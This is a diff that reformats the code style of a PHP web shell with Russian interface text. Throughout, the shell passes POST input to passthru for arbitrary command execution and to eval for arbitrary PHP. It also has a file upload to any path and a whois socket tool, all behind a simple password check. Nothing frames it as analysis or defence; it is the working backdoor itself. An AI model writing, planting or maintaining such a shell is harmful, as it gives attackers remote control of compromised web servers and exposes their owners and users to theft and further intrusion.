@@ -49,9 +49,13 @@ if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass || empty($_S
 
 
 
-if (!empty($_GET['ac'])) {$ac = $_GET['ac'];}
-elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}
-else {$ac = "shell";}
+if (!empty($_GET['ac'])) {
+    $ac = $_GET['ac'];
+} elseif (!empty($_POST['ac'])) {
+    $ac = $_POST['ac'];
+} else {
+    $ac = "shell";
+}
 
 // Menu
 echo "
@@ -63,7 +67,7 @@ echo "
 <br><br><br><pre>";
 
 
-switch($ac) {
+switch ($ac) {
 
 // Shell
 case "shell":
@@ -80,8 +84,8 @@ $$sern <input size="50" type="text" name="c"><input align="right" type="submit" 
 <textarea cols="100" rows="25">
 HTML;
 
-if (!empty($_POST['c'])){
-passthru($_POST['c']);
+if (!empty($_POST['c'])) {
+    passthru($_POST['c']);
 }
 echo "</textarea></td>$tend";
 break;
@@ -103,8 +107,8 @@ echo <<<HTML
 $tend
 HTML;
 
-if (isset($_POST['ephp'])){
-eval($_POST['ephp']);
+if (isset($_POST['ephp'])) {
+    eval($_POST['ephp']);
 }
 break;
 
@@ -132,21 +136,21 @@ $tend
 HTML;
 
 if (!empty($_POST['tot']) && !empty($_POST['tac'])) {
-
-switch($_POST['tac']) {
+    switch ($_POST['tac']) {
 
 case "1":
 echo "Раскодированный текст:<b>" .base64_decode($_POST['tot']). "</b>";
-break;
+    break;
 
-case "2":
+    case "2":
 echo "Кодированный текст:<b>" .base64_encode($_POST['tot']). "</b>";
-break;
+    break;
 
-case "3":
+    case "3":
 echo "Кодированный текст:<b>" .md5($_POST['tot']). "</b>";
-break;
-}}
+    break;
+}
+}
 break;
 
 
@@ -168,20 +172,20 @@ echo <<<HTML
 $tend
 HTML;
 
-if (isset($_POST['path'])){
+if (isset($_POST['path'])) {
+    $uploadfile = $_POST['path'].$_FILES['file']['name'];
+    if ($_POST['path']=="") {
+        $uploadfile = $_FILES['file']['name'];
+    }
 
-$uploadfile = $_POST['path'].$_FILES['file']['name'];
-if ($_POST['path']==""){$uploadfile = $_FILES['file']['name'];}
-
-if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
-    echo "Файло успешно загружен в папку $uploadfile\n";
-    echo "Имя:" .$_FILES['file']['name']. "\n";
-    echo "Размер:" .$_FILES['file']['size']. "\n";
-
-} else {
-    print "Не удаётся загрузить файло. Инфа:\n";
-    print_r($_FILES);
-}
+    if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
+        echo "Файло успешно загружен в папку $uploadfile\n";
+        echo "Имя:" .$_FILES['file']['name']. "\n";
+        echo "Размер:" .$_FILES['file']['size']. "\n";
+    } else {
+        print "Не удаётся загрузить файло. Инфа:\n";
+        print_r($_FILES);
+    }
 }
 break;
 
@@ -208,17 +212,25 @@ $tend
 HTML;
 
 if (isset($_POST['wq']) && $_POST['wq']<>"") {
+    if (empty($_POST['wser'])) {
+        $wser = "whois.ripe.net";
+    } else {
+        $wser = $_POST['wser'];
+    }
 
-if (empty($_POST['wser'])) {$wser = "whois.ripe.net";} else $wser = $_POST['wser'];
+    $querty = $_POST['wq']."\r\n";
+    $fp = fsockopen($wser, 43);
 
-$querty = $_POST['wq']."\r\n";
-$fp = fsockopen($wser, 43);
-
-if (!$fp) {echo "Не могу открыть сокет";} else {
-fputs($fp, $querty);
-while(!feof($fp)){echo fgets($fp, 4000);}
-fclose($fp);
-}}
+    if (!$fp) {
+        echo "Не могу открыть сокет";
+    } else {
+        fputs($fp, $querty);
+        while (!feof($fp)) {
+            echo fgets($fp, 4000);
+        }
+        fclose($fp);
+    }
+}
 break;
 
 
